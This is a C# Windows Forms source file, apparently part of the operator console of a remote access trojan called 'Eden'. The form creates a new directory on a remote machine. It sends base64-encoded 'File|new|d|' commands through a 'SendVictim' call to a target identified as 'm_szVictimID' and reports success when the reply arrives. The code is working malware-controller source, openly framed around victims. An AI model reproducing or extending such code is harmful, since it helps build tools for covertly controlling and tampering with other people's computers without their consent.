using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileAddDir : Form
    {
        public clsClient m_clnt;
        public string m_szVictimID;

        public frmFileAddDir(clsClient clnt, string szVictimID)
        {
            InitializeComponent();

            m_clnt = clnt;
            m_szVictimID = szVictimID;

            Text = "New Directory";
            StartPosition = FormStartPosition.CenterScreen;
        }

        void fnRecv(clsClient m_clnt, string szVictimID, List<string> lsMsg)
        {
            if (!string.Equals(szVictimID, m_szVictimID))
                return;

            if (lsMsg[0] == "file")
            {
                if (lsMsg[1] == "new")
                {
                    if (lsMsg[2] == "d")
                    {
                        string szDirName = EZCrypto.Encoder.b64d2str(lsMsg[3]);
                        int nCode = int.Parse(lsMsg[4]);

                        if (nCode == 1)
                        {
                            MessageBox.Show("Add directory successfully:\n" + szDirName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            Invoke(Close);
                        }
                    }
                }
            }
        }

        void setup()
        {
            m_clnt.ServerMessageReceived += fnRecv;

            textBox1.Text = "NewFolder_" + clsTools.GetFileNameFromDatetime();
        }

        private void frmFileAddDir_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            m_clnt.SendVictim(m_szVictimID, "File|new|d|" + EZCrypto.Encoder.stre2b64(textBox1.Text));
        }

        private void frmFileAddDir_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_clnt.ServerMessageReceived -= fnRecv;
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                m_clnt.SendVictim(m_szVictimID, "File|new|d|" + EZCrypto.Encoder.stre2b64(textBox1.Text));
            }
        }
    }
}
